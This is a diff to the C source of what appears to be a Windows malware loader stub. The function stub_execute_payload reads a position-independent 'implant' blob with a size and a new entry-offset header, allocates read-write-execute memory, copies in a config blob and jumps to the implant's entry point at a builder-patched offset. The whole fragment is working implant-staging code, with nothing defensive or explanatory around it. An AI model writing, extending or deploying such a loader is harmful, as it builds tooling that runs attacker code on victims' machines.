@@ -437,12 +437,15 @@ static inline void stub_execute_payload(void) {
     if (!pic_ptr)
         STUB_FAIL(105);
 
-    /* pic_ptr now points to [pic_size: u32 LE][pic data...] */
+    /* pic_ptr now points to [pic_size: u32 LE][entry_offset: u32 LE][pic data...] */
     DWORD pic_size = *(DWORD *)pic_ptr;
-    PBYTE pic_data = pic_ptr + sizeof(DWORD);
+    DWORD pic_entry_off = *(DWORD *)(pic_ptr + sizeof(DWORD));
+    PBYTE pic_data = pic_ptr + sizeof(DWORD) + sizeof(DWORD);
 
     if (pic_size == 0)
         STUB_FAIL(106);
+    if (pic_entry_off >= pic_size)
+        pic_entry_off = 0; /* safety fallback */
 
     /* Step 5: Allocate RWX memory for PIC blob + config */
     SIZE_T alloc_size = (SIZE_T)pic_size + sizeof(DWORD) + (SIZE_T)config_len;
@@ -459,8 +462,8 @@ static inline void stub_execute_payload(void) {
     *(DWORD *)config_dst = config_len;
     stub_memcpy(config_dst + sizeof(DWORD), config_blob, config_len);
 
-    /* Step 8: Jump to PIC entry point */
-    fn_implant_entry entry = (fn_implant_entry)exec_mem;
+    /* Step 8: Jump to PIC entry point at the builder-patched offset */
+    fn_implant_entry entry = (fn_implant_entry)((PBYTE)exec_mem + pic_entry_off);
     entry(NULL);
 
     #undef STUB_FAIL
